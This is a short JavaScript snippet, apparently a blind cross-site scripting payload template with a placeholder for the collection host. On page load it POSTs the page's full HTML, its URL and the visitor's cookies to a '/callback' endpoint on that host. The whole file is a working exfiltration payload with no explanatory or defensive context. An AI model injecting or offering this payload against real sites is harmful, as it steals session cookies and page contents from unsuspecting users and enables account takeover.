window.onload = function() {
    fetch(window.location.protocol+"//{{.}}/callback", {
        method: 'POST',
        headers: {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "body": document.documentElement.innerHTML,
            "url": document.URL,
            "cookie": document.cookie
        })
    })
};

